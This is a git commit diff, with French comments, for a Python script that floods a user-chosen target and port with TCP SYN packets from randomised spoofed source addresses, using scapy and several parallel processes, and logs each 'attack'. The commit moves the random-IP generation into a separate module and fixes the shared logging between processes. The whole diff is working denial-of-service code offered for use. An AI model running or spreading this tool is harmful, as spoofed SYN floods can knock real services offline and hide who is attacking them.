dfdd04aea2b68fec293a72f8833db8e0bf970c8b
Macareux-moine <166114484+Macareux-moine@users.noreply.github.com>
2024-04-29 21:39:09 +0200

    Update synflood_multi.py
    j'ai sortie la generation des ip rand dans un autre script, j'ai sorti la journalisation de def syn qui evite les proble de copie dans le fichier attaque.

--- synflood/modules/synflood_multi.py
+++ synflood/modules/synflood_multi.py
@@ -2,38 +2,44 @@ from barre_de_progression import barre
 from scapy.all import *
 import multiprocessing
 from demande_user import DemandeUtilisateur
-import os
 from journaltest import Journal
+import sys
+from ip_aleatoire import generer_ip_sources
 
-
-def envois(cible, port, nbrpaquet, ip_sources, journal):
+def envois(cible, port, nbrpaquet, results):
     messages = []
     for _ in range(nbrpaquet):
-        ip_source = str(RandIP())
-        ip_sources.append(ip_source)
+        ip_source = generer_ip_sources()
         message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
         print(message)  # Affichage dans la console
         ip = IP(dst=cible, src=ip_source)
         tcpsyn = TCP(dport=port, flags="S")
         send(ip/tcpsyn, verbose=False)
         messages.append(message)  # Ajouter le message à la liste
-    return messages
+    results.extend(messages)
+
+def journaliser(cible, port, nbrpaquet, nbr_processus, messages):
+    journal = Journal()
+    journal.log_demande(cible, port, nbrpaquet, nbr_processus)
+    journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)
 
 def syn(cible, port, nbrpaquet, nbr_processus):
     packets_per_process = nbrpaquet // nbr_processus
-    ip_sources = []
-    journal = Journal() 
-    messages = envois(cible, port, packets_per_process, ip_sources, journal)  # Appel de la fonction avec les bons arguments
+    results = multiprocessing.Manager().list()  # Liste partagée pour stocker les messages de tous les processus
+    processes = []
+
     for _ in range(nbr_processus):
-        p = multiprocessing.Process(target=envois, args=(cible, port, packets_per_process, ip_sources, journal))
+        p = multiprocessing.Process(target=envois, args=(cible, port, packets_per_process, results))
+        processes.append(p)
         p.start()
 
+    for p in processes:
+        p.join()
+
     barre(nbrpaquet)
-    
-    premier_message = messages[0]  # Choisissez le premier message
-    
-    journal.log_demande(cible, port, nbrpaquet, nbr_processus)  
-    journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)
+
+    premier_message = results[0]  # Choisissez le premier message
+    journaliser(cible, port, nbrpaquet, nbr_processus, results)
 
 if __name__ == "__main__":
     demande_utilisateur = DemandeUtilisateur()
